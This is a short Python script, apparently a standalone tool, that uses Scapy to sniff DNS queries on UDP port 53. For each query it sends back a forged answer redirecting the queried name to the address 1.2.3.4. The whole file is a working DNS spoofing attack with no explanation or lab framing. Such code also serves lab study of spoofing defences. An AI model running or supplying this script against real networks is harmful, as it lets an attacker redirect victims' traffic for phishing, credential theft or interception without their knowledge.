from scapy.all import *

def spoof_dns(pkt):
    if pkt.haslayer(DNSQR):
        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                      UDP(dport=pkt[UDP].sport, sport=53)/\
                      DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=DNSRR(rrname=pkt[DNS].qd.qname, rdata="1.2.3.4"))
        send(spoofed_pkt, verbose=0)
        print(f"[+] Spoofed DNS Response Sent to {pkt[IP].src}")

sniff(filter="udp port 53", prn=spoof_dns)
